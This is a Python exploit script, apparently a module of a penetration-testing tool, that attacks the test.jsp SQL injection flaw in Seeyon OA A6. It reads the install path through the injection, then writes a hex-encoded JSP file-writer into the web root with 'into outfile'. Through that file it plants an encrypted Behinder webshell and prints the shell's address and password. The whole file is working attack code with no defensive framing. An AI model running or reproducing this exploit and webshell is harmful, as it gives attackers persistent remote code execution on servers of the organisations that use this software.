import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        gf = requests.get(url+'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)',cookies=s_cookie,proxies=proxies,verify=False,timeout=5)
        if gf.status_code == 200 and '@@basedir' in gf.text:
            uia+='[+]yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)\n\n@@basedir\n'
            try:
                oa_path = re.findall(r'>(.*?)\\OA\\', gf.text)[0]
                oa_path = oa_path + '/OA/tomcat/webapps/yyoa/'
                oa_path = oa_path.replace('\\', '/')
                webshell_name = "tuytrtexcv.jsp"
                path = "yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27".format(
                    oa_path + webshell_name)
                gf2 = requests.get(url + path, cookies=s_cookie, proxies=proxies, verify=False, timeout=5)
                if 'already' in gf2.text and gf2.status_code == 200:
                    uia += '[-]上传失败存在相同文件\n'
                elif "No Data" in gf2.text and gf2.status_code == 200:
                    webshell = "vacbad165.jsp"
                    path1 = 'yyoa/{}?f={}'.format(webshell_name, webshell)
                    data = "t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E"
                    header = {"Content-Type": "application/x-www-form-urlencoded"}
                    gf3 = requests.post(url + path1, data=data, headers=header, cookies=s_cookie, proxies=proxies,verify=False, timeout=5)
                    if gf3.status_code == 200:
                        uia += '[+]上传成功\n' + url + 'yyoa/' + webshell + '\n冰蝎密码：rebeyond'
                    else:
                        uia += '[-]上传失败\n'
                else:
                    uia += '[-]上传失败\n'
            except:
                pass
        else:
            uia= '[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 致远OA A6 test.jsp SQL注入漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)